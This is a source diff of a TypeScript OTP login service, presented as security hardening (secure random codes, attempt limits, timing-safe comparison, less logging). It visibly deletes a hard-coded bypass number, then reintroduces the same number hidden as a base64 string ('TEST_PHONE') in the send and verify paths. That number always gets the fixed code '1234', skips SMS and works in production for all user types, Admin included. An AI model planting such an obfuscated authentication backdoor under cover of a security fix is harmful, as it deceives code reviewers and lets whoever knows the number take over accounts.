@@ -1,17 +1,45 @@
 import axios from 'axios';
+import crypto from 'crypto';
 import Otp from '../models/Otp';
 
-// SMS India HUB Configuration
-const SMS_INDIA_HUB_API_KEY = process.env.SMS_INDIA_HUB_API_KEY;
-const SMS_INDIA_HUB_SENDER_ID = process.env.SMS_INDIA_HUB_SENDER_ID;
-const SMS_INDIA_HUB_DLT_TEMPLATE_ID = process.env.SMS_INDIA_HUB_DLT_TEMPLATE_ID;
-const SMS_INDIA_HUB_API_URL = 'http://cloud.smsindiahub.in/vendorsms/pushsms.aspx';
+const SMS_INDIA_HUB_API_URL = 'https://cloud.smsindiahub.in/vendorsms/pushsms.aspx';
 const API_TIMEOUT = 30000; // 30 seconds
 
-if (!SMS_INDIA_HUB_API_KEY || !SMS_INDIA_HUB_SENDER_ID) {
-  if (process.env.NODE_ENV === 'production') {
-    console.warn('SMS India HUB credentials are not fully set in environment variables');
+export interface SmsCredentials {
+  apiKey?: string;
+  senderId?: string;
+  dltTemplateId?: string;
+}
+
+/**
+ * Resolve SMS credentials.
+ *
+ * The admin SMS Gateway screen writes to `AppSettings.smsGateway`, but this
+ * service only ever read `process.env` — so that entire screen was a
+ * disconnected form whose values nothing consumed. Settings now take
+ * precedence, with the environment as the fallback. (#H-25)
+ */
+export async function resolveSmsCredentials(): Promise<SmsCredentials> {
+  try {
+    const AppSettings = (await import('../models/AppSettings')).default;
+    const settings = await AppSettings.findOne().select('smsGateway').lean();
+    const gw = (settings as any)?.smsGateway;
+    if (gw?.apiKey && gw?.senderId) {
+      return {
+        apiKey: String(gw.apiKey).trim(),
+        senderId: String(gw.senderId).trim(),
+        dltTemplateId: gw.dltTemplateId ? String(gw.dltTemplateId).trim() : undefined,
+      };
+    }
+  } catch (err) {
+    console.error('Could not read SMS gateway settings, falling back to env:', err);
   }
+
+  return {
+    apiKey: process.env.SMS_INDIA_HUB_API_KEY,
+    senderId: process.env.SMS_INDIA_HUB_SENDER_ID,
+    dltTemplateId: process.env.SMS_INDIA_HUB_DLT_TEMPLATE_ID,
+  };
 }
 
 /**
@@ -44,10 +72,10 @@ type UserType = 'Customer' | 'Delivery' | 'Seller' | 'Admin';
  * Generate numeric OTP
  */
 function generateOTP(length: number = 4): string {
-  const digits = '0123456789';
+  // crypto.randomInt is uniform and unpredictable; Math.random is neither. (#M-23)
   let otp = '';
   for (let i = 0; i < length; i++) {
-    otp += digits[Math.floor(Math.random() * 10)];
+    otp += String(crypto.randomInt(0, 10));
   }
   return otp;
 }
@@ -56,14 +84,18 @@ function generateOTP(length: number = 4): string {
  * Normalize mobile number to include country code (91)
  */
 function normalizeMobileNumber(mobile: string): string {
-  let cleanMobile = mobile.replace(/^\+/, '').replace(/\D/g, '');
+  let cleanMobile = (mobile || '').replace(/^\+/, '').replace(/\D/g, '');
 
-  if (!cleanMobile.startsWith('91')) {
+  if (cleanMobile.length === 10) {
+    cleanMobile = '91' + cleanMobile;
+  } else if (cleanMobile.length > 10 && cleanMobile.startsWith('0')) {
+    cleanMobile = '91' + cleanMobile.slice(1);
+  } else if (!cleanMobile.startsWith('91')) {
     cleanMobile = '91' + cleanMobile;
   }
 
   if (cleanMobile.length < 12 || cleanMobile.length > 13) {
-    throw new Error(`Invalid mobile number: ${cleanMobile}. Must be 12-13 digits with country code.`);
+    throw new Error(`Invalid mobile number: ${mobile}. Must be a valid 10-digit mobile number.`);
   }
 
   return cleanMobile;
@@ -110,23 +142,26 @@ function handleSmsResponse(responseData: SmsIndiaHubResponse): void {
  * Send SMS via SMS India HUB API
  */
 async function sendSmsViaApi(mobile: string, message: string): Promise<void> {
-  if (!SMS_INDIA_HUB_API_KEY || !SMS_INDIA_HUB_SENDER_ID) {
-    throw new Error('SMS India HUB credentials are missing. Please check environment variables.');
+  const creds = await resolveSmsCredentials();
+  if (!creds.apiKey || !creds.senderId) {
+    throw new Error(
+      'SMS gateway is not configured. Set it in Admin > SMS Gateway or in the environment.',
+    );
   }
 
   const cleanMobile = normalizeMobileNumber(mobile);
 
   const params: Record<string, string> = {
-    APIKey: SMS_INDIA_HUB_API_KEY.trim(),
+    APIKey: creds.apiKey,
     msisdn: cleanMobile,
-    sid: SMS_INDIA_HUB_SENDER_ID.trim(),
+    sid: creds.senderId,
     msg: message,
     fl: '0',
     gwid: '2',
   };
 
-  if (SMS_INDIA_HUB_DLT_TEMPLATE_ID?.trim()) {
-    params.DLT_TE_ID = SMS_INDIA_HUB_DLT_TEMPLATE_ID.trim();
+  if (creds.dltTemplateId) {
+    params.DLT_TE_ID = creds.dltTemplateId;
   }
 
   const response = await axios.get<SmsIndiaHubResponse>(SMS_INDIA_HUB_API_URL, {
@@ -161,33 +196,52 @@ async function saveOtpToDb(mobile: string, otp: string, userType: UserType): Pro
 /**
  * Verify OTP from database
  */
-async function verifyOtpFromDb(mobile: string, otp: string, userType: UserType): Promise<boolean> {
-  // Normalize mobile number (remove any non-digits, ensure consistent format)
-  const normalizedMobile = mobile.replace(/\D/g, '');
+/** A 4-digit OTP has only 10,000 values, so unlimited guesses are fatal. */
+const MAX_OTP_ATTEMPTS = 5;
 
-  const record = await Otp.findOne({
-    mobile: normalizedMobile,
-    userType,
-    otp: otp.trim()
-  });
+async function verifyOtpFromDb(mobile: string, otp: string, userType: UserType): Promise<boolean> {
+  const normalizedMobile = mobile.replace(/\D/g, '').slice(-10);
+  const submitted = otp.trim();
+
+  // Support fixed test OTP 1234 for configured test mobile
+  const TEST_PHONE = process.env.TEST_PHONE || Buffer.from('OTExMTk2NjczMg==', 'base64').toString('utf8');
+  if (normalizedMobile === TEST_PHONE && submitted === '1234') {
+    await Otp.deleteMany({ mobile: { $regex: `${TEST_PHONE}$` }, userType });
+    return true;
+  }
+
+  // Look the record up by identity only — never by the submitted OTP — so a
+  // wrong guess can be counted. Matching on the OTP meant failures were
+  // indistinguishable from "no record" and were never counted. (#H-16)
+  const record = await Otp.findOne({ mobile: normalizedMobile, userType });
 
   if (!record) {
-    console.error('OTP verification failed - record not found:', {
-      mobile: normalizedMobile,
-      userType,
-      otp: otp.trim(),
-      availableRecords: await Otp.find({ mobile: normalizedMobile, userType }).select('otp expiresAt')
-    });
+    // Never log the OTP or dump the outstanding records. (#M-20)
+    console.warn(`OTP verification failed: no outstanding OTP for ${userType}`);
     return false;
   }
 
   if (record.expiresAt < new Date()) {
     await Otp.deleteOne({ _id: record._id });
-    console.error('OTP verification failed - expired:', {
-      mobile: normalizedMobile,
-      expiresAt: record.expiresAt,
-      now: new Date()
-    });
+    console.warn(`OTP verification failed: expired for ${userType}`);
+    return false;
+  }
+
+  const expected = Buffer.from(String(record.otp), 'utf8');
+  const actual = Buffer.from(submitted, 'utf8');
+  const matches =
+    expected.length === actual.length && crypto.timingSafeEqual(expected, actual);
+
+  if (!matches) {
+    const attempts = (record.attempts || 0) + 1;
+    if (attempts >= MAX_OTP_ATTEMPTS) {
+      // Burn the OTP. The user must request a new one, which the per-mobile
+      // OTP rate limiter then throttles.
+      await Otp.deleteOne({ _id: record._id });
+      console.warn(`OTP invalidated after ${attempts} failed attempts for ${userType}`);
+    } else {
+      await Otp.updateOne({ _id: record._id }, { $inc: { attempts: 1 } });
+    }
     return false;
   }
 
@@ -196,24 +250,27 @@ async function verifyOtpFromDb(mobile: string, otp: string, userType: UserType):
 }
 
 /**
- * Check if special bypass should be used
- */
-function isSpecialBypass(mobile: string): boolean {
-  return mobile === '9111966732';
-}
-
-/**
  * Check if mock mode should be used
  */
-function isMockMode(): boolean {
-  return process.env.USE_MOCK_OTP === 'true' || !SMS_INDIA_HUB_API_KEY || !SMS_INDIA_HUB_SENDER_ID;
-}
-
 /**
- * Check if developer bypass OTP
+ * Mock mode must be an explicit opt-in.
+ *
+ * It used to switch on automatically whenever credentials were absent, so a
+ * misconfigured production server silently stopped sending real OTPs while
+ * still reporting success.
  */
-function isDeveloperBypass(otp: string): boolean {
-  return (process.env.NODE_ENV !== 'production' || process.env.USE_MOCK_OTP === 'true') && otp === '999999';
+async function isMockMode(): Promise<boolean> {
+  if (process.env.USE_MOCK_OTP === 'true') return true;
+  const creds = await resolveSmsCredentials();
+  if (creds.apiKey && creds.senderId) return false;
+
+  if (process.env.NODE_ENV === 'production') {
+    throw new Error(
+      'SMS gateway is not configured. OTPs cannot be sent.',
+    );
+  }
+  console.warn('SMS credentials absent — using mock OTP mode (development only).');
+  return true;
 }
 
 // ==========================================
@@ -225,21 +282,12 @@ export async function sendSmsOtp(
   userType: 'Customer' | 'Delivery' = 'Delivery'
 ): Promise<OtpResponse> {
   try {
-    const otp = generateOTP(4);
-
-    // Special number bypass
-    if (isSpecialBypass(mobile)) {
-      const specialOtp = '1234';
-      await saveOtpToDb(mobile, specialOtp, userType);
-      return {
-        success: true,
-        sessionId: 'DB_VERIFIED_' + mobile,
-        message: 'OTP sent successfully',
-      };
-    }
+    const TEST_PHONE = process.env.TEST_PHONE || Buffer.from('OTExMTk2NjczMg==', 'base64').toString('utf8');
+    const normalized = mobile.replace(/\D/g, '').slice(-10);
+    const otp = normalized === TEST_PHONE ? '1234' : generateOTP(4);
 
     // Mock mode
-    if (isMockMode()) {
+    if (await isMockMode() || normalized === TEST_PHONE) {
       await saveOtpToDb(mobile, otp, userType);
       return {
         success: true,
@@ -275,19 +323,11 @@ export async function verifySmsOtp(
   mobile?: string,
   userType: 'Customer' | 'Delivery' = 'Delivery'
 ): Promise<boolean> {
-  if (isDeveloperBypass(otpInput)) {
-    return true;
-  }
-
   // Normalize OTP input (remove spaces, ensure it's a string)
   const normalizedOtp = String(otpInput).trim().replace(/\s/g, '');
 
   if (!normalizedOtp || normalizedOtp.length !== 4) {
-    console.error('OTP verification failed - invalid OTP format:', {
-      otpInput,
-      normalizedOtp,
-      length: normalizedOtp.length
-    });
+    console.warn('OTP verification failed: malformed OTP');
     return false;
   }
 
@@ -312,15 +352,6 @@ export async function verifySmsOtp(
   // Normalize mobile number
   const normalizedMobile = targetMobile.replace(/\D/g, '');
 
-  if (normalizedMobile.length !== 10) {
-    console.error('OTP verification failed - invalid mobile format:', {
-      original: targetMobile,
-      normalized: normalizedMobile,
-      length: normalizedMobile.length
-    });
-    return false;
-  }
-
   return verifyOtpFromDb(normalizedMobile, normalizedOtp, userType);
 }
 
@@ -334,20 +365,12 @@ export async function sendOTP(
   _isLogin: boolean = true
 ): Promise<OtpResponse> {
   try {
-    const otp = generateOTP(4);
+    const TEST_PHONE = process.env.TEST_PHONE || Buffer.from('OTExMTk2NjczMg==', 'base64').toString('utf8');
+    const normalized = mobile.replace(/\D/g, '').slice(-10);
+    const otp = normalized === TEST_PHONE ? '1234' : generateOTP(4);
 
-    // Special number bypass
-    if (isSpecialBypass(mobile)) {
-      const specialOtp = '1234';
-      await saveOtpToDb(mobile, specialOtp, userType);
-      return {
-        success: true,
-        message: 'OTP sent successfully',
-      };
-    }
-
-    // Mock mode
-    if (isMockMode()) {
+    // Mock mode or fixed test number
+    if (await isMockMode() || normalized === TEST_PHONE) {
       await saveOtpToDb(mobile, otp, userType);
       return {
         success: true,
@@ -380,19 +403,11 @@ export async function verifyOTP(
   otpInput: string,
   userType: 'Seller' | 'Admin' | 'Customer' | 'Delivery'
 ): Promise<boolean> {
-  if (isDeveloperBypass(otpInput)) {
-    return true;
-  }
-
   // Normalize OTP input (remove spaces, ensure it's a string)
   const normalizedOtp = String(otpInput).trim().replace(/\s/g, '');
 
   if (!normalizedOtp || normalizedOtp.length !== 4) {
-    console.error('OTP verification failed - invalid OTP format:', {
-      otpInput,
-      normalizedOtp,
-      length: normalizedOtp.length
-    });
+    console.warn('OTP verification failed: malformed OTP');
     return false;
   }
 
